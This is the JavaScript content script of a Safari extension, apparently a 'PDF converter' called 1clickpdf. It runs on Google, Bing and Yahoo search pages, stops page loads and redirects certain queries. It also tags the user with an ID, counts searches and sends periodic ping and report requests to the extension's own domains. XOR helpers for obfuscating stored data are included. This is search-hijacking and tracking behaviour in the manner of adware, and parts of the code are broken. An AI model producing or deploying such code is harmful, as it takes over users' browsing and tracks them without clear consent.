var debugging = true;

var keys = {
storage: '1clickpdf',
pdf_search: 'https://www.google.com/search?q=filetype%3Apdf&{searchTerms}',
omni_search: 'https://www.google.com/search?q={searchTerms}',
    //omni_search: 'https://www.bing.com/search?q={searchTerms}',
random: '849OQQ106&$kBDaN0iYPvyOlnCsXisi^',
ver: safari.extension.displayVersion,
os: navigator.appVersion.indexOf('Mac') != -1 ? 'mac' : 'win',
country: '',
report: true,
ping: {
check: (debugging ? 1 : 5) * 60 * 1000, // check every x minutes
send: (debugging ? 0.1 : 24) * 60 * 60 * 1000, // send if passed more than x hours from last ping
},
domains: {
main: 'https://1clickpdf.com',
ping: 'https://1clickpdf.com',
report: 'https://1clickpdf.com',
save: 'https://1clickpdf.com',
search: 'https://1clickpdf.com',
typ: 'https://bestformac.net',
},
persistant: true,
keywords: ['pdf', 'convert'],
};

var storage = {
user_id: '',
counter: 0,
l_ping: 0,
timestamp: 0,
version: 0,
encoded: '',
};
var urls = {
typ: function() {
    return keys.domains.typ + '/special/?uid=' + storage.user_id + '&o=' + keys.os + '&v=' + keys.ver;
},
ping: function() {
    return keys.domains.ping + '/ping?uid=' + storage.user_id + '&c=' + storage.counter + '&a=' + getExtensionAge('days', 2) + '&o=' + keys.os +
    '&gl=' + keys.country + '&v=' + keys.ver;
},
report: function(keyword) {
    return keys.domains.report + '/report?uid=' + storage.user_id + '&c=' + storage.counter + '&a=' + getExtensionAge('days', 2) +
    '&o=' + keys.os + '&gl=' + keys.country + '&v=' + keys.ver;
},
save: function() {
    return keys.domains.save + '/save/' + storage.user_id + '?c=' + storage.counter + '&a=' + getExtensionAge('days', 2) + '&o=' + keys.os +
    '&gl=' + keys.country + '&v=' + keys.ver;
},
uid: function() {
    return keys.domains.save + '/uid';
}
};
var XOR = {
utf8ToBinaryString: function(str) {
    var escstr = encodeURIComponent(str);
    // replaces any uri escape sequence, such as %0A,
    // with binary escape, such as 0x0A
    var binstr = escstr.replace(/%([0-9A-F]{2})/g, function(match, p1) {
                                return String.fromCharCode(parseInt(p1, 16));
                                });
    return binstr;
},
binaryStringToUtf8: function(binstr) {
    var escstr = binstr.replace(/(.)/g, function(m, p) {
                                var code = p.charCodeAt(0).toString(16).toUpperCase();
                                if (code.length < 2) {
                                code = '0' + code;
                                }
                                return '%' + code;
                                });
    return decodeURIComponent(escstr);
},
utf8ToBase64: function(str) {
    var binstr = this.utf8ToBinaryString(str);
    return btoa(binstr);
},
base64ToUtf8: function(b64) {
    var binstr = atob(b64);
    return this.binaryStringToUtf8(binstr);
},
encode: function(key, data) {
    return this.utf8ToBase64(this.xorStrings(key, JSON.stringify(data)));
},
decode: function(key, data) {
    data = this.base64ToUtf8(data);
    return JSON.parse(this.xorStrings(key, data));
},
xorStrings: function(key, input) {
    var output = '';
    for (var i = 0; i < input.length; i++) {
        var c = input.charCodeAt(i);
        var k = key.charCodeAt(i % key.length);
        output += String.fromCharCode(c ^ k);
    }
    return output;
},
};


function getExtensionAge(unit, places) {
    unit = typeof unit === 'undefined' ? 'days' : unit;
    places = typeof places === 'undefined' ? 2 : places;
    var age = new Date().getTime() - storage.timestamp;
    
    switch (unit) {
        case 'seconds':
            age = age / 1000;
            break;
        case 'minutes':
            age = age / 1000 / 60;
            break;
        case 'hours':
            age = age / 1000 / 60 / 60;
            break;
        case 'days':
            age = age / 1000 / 60 / 60 / 24;
            break;
    }
    
    return age.toFixed(places);
}

console.log(location.href);

safari.self.addEventListener("message", handleMessage);
//if(location.href.indexOf('q=Hello') < 0){
//    refresh();
//}

if( ((location.href.indexOf('www.bing') > -1) && (location.href.indexOf('form=APMCS1')> -1)) ||
   ((location.href.indexOf('www.google') > -1) && (location.href.indexOf('/search?client=safari')> -1)) ||
   (((location.href.indexOf('www.yahoo') > -1) || (location.href.indexOf('search.yahoo') > -1)) && (location.href.indexOf('/search?ei=utf-8&fr=aaplw&p=')> -1)) )
{
	console.log("Step1");
    if(location.href.indexOf('q=Hello') < 0){
//        window.stop();
//        refresh();
    }
    
//        window.stop();
//    onBeforeSearch()

	console.log(document.URL);
	var newurl = document.URL;
	safari.extension.dispatchMessage(newurl);
//    onBeforeSearch(document);
	
}
if(location.href.indexOf('convert.html') < 0 && (location.href.indexOf('filetype:pdf') < 0)){
    onBeforeSearch();
}

function refresh() {
    
//    window.location.href = "https://www.google.com/search?client=safari&rls=en&q=Hello&ie=UTF-8&oe=UTF-8";
//     window.location.reload(true);
//    var url = location.origin;
//    var pathname = location.pathname;
//    var hash = location.hash;
//    location.href = "https://www.google/search?client=safari/?q=hello"
//    location = url + pathname + '?application_refresh=' + (Math.random() * 100000) + hash;
}

function handleMessage(event) {
//    onBeforeSearch(event)
//    console.log(event.name);
//    var urhell = event.name;
//    var newUrl = "";
//    console.log("Holy Step1");
//    if( urhell.indexOf('tagSearchQuery') > 0)
//    {
//        console.log("Holy Step2");
//        event.preventDefault();
//        newUrl = urhell.replace("tagSearchQuery","");
//        console.log(newUrl);
//        window.location.href = newUrl;
//
//    }

    console.log(newUrl);
}

function SendRequest(url, callback_body, callback_headers) {
    var xhr = new XMLHttpRequest();
    xhr.open('GET', url);
    xhr.onreadystatechange = function() {
        if (xhr.readyState == 4) {
            if (xhr.status >= 200 && xhr.status < 400) {
                if (callback_body) {
                    callback_body(xhr.responseText);
                }
                if (callback_headers) {
                    callback_headers(xhr.getAllResponseHeaders());
                }
            } else {
                log('xhr status error: ' + xhr.statusText);
            }
        }
    };
    xhr.onerror = function(e) {
        log('xhr error: ' + xhr.statusText);
    };
    xhr.send();
}

function onBeforeSearch() {
    var searchUrl;
    let params = (new URL(document.location)).searchParams;
    let searchKeyword = params.get("q");
    var searchTerms = document.location.search;
    
    var semi_pos = document.location.href.indexOf(':');
    if (keys.keywords.indexOf(searchKeyword.toLowerCase().trim()) !== -1) {
        window.stop();
        searchUrl = safari.extension.baseURI + 'convert.html';
            window.location.href = searchUrl;
    }
    else if ( true == searchKeyword.startsWith("pdf")){
        window.stop();

        searchUrl = keys.pdf_search.replace(/\{searchTerms\}/g, ("q="+searchKeyword));
            window.location.href = searchUrl;
    } else {
        searchUrl = keys.omni_search.replace(/\{searchTerms\}/g, encodeURIComponent(searchTerms));
        storage.counter++;
        setTimeout(function() {
                   if (keys.report === true) {
                   SendRequest(urls.report(searchTerms), function(ret) {
                               log('reporting enabled: ' + searchTerms);
                               });
                   }
                   }, 50);
//        Store.setItem(keys.storage, storage);
    }
    console.log('searchUrl: ' + searchUrl);

}


